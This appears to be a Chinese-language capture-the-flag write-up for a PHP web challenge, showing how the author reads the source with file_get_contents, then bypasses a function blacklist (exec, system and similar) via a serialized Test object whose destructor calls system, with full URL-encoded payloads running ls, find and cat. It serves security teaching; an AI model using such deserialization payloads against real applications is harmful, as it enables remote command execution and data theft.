考点：

　　1，​ file_get_contents

　　2，反序列化

进入靶场

![](https://img2020.cnblogs.com/blog/2443617/202111/2443617-20211104215727182-291741036.png)

有一个警示：看一下网页源码，

![](https://img2020.cnblogs.com/blog/2443617/202111/2443617-20211104215844443-214314106.png)

 发现是javascript语句，每过五秒提交一次 form1 表单。 是一个post请求，抓包看一下

![](https://img2020.cnblogs.com/blog/2443617/202111/2443617-20211104220147345-20520036.png)

 猜测是用func来执行p，尝试

func=system&p=ls

![](https://img2020.cnblogs.com/blog/2443617/202111/2443617-20211104220445785-86069661.png)

 发现被过滤了，尝试能不能读取index.php的内容。

 file_get_contents： 把整个文件读入一个字符串中。该函数是用于把文件的内容读入到一个字符串中的首选方法。

func=file_get_contents&p=index.php

![](https://img2020.cnblogs.com/blog/2443617/202111/2443617-20211104220631214-455593942.png)

 得到php源码，进行代码审计。

<?php
$disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
function gettime($func, $p) {
    $result = call_user_func($func, $p);
    $a= gettype($result);
    if ($a == "string") {
        return $result;
    } else {return "";}
}
class Test {
    var $p = "Y-m-d h:i:s a";
    var $func = "date";
    function __destruct() {
        if ($this->func != "") {
            echo gettime($this->func, $this->p);
        }
    }
}
$func = $_REQUEST["func"];
$p = $_REQUEST["p"];

if ($func != null) {
    $func = strtolower($func);
    if (!in_array($func,$disable_fun)) {
        echo gettime($func, $p);
    }else {
        die("Hacker...");
    }
}
?>

主函数输入func和p,判断func是否为空，strtolower()将func的内容全改成小写，判断func的内容是否在$disable_fun中，若不在，就执行gettime()函数，否则就输出Hacker...

源码中有一个Test类没用到。提醒我们用反序列化。尝试构造

<?php
class Test
{
    var $p = "ls";
    var $func = "system";
}
$a = new Test();
echo urlencode(serialize($a));
?>  
  
O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A2%3A%22ls%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D

![](https://img2020.cnblogs.com/blog/2443617/202111/2443617-20211104221526882-1666718415.png)

 成功执行，

尝试查找文件名为flag开头的文件 find / -name flag*

<?php
class Test
{
    var $p = "find / -name flag*";
    var $func = "system";
}
$a = new Test();
echo urlencode(serialize($a));
?>  
  
O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A18%3A%22find+%2F+-name+flag%2A%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D

![](https://img2020.cnblogs.com/blog/2443617/202111/2443617-20211104221916005-902019679.png)

 猜测flag的位置在最后两个文件，查看文件内容。

<?php
class Test
{
    var $p = "cat /tmp/flagoefiu4r93";
    var $func = "system";
}
$a = new Test();
echo urlencode(serialize($a));
?>  
  
O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A22%3A%22cat+%2Ftmp%2Fflagoefiu4r93%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D

![](https://img2020.cnblogs.com/blog/2443617/202111/2443617-20211104222110044-2132811607.png)

 得到flag。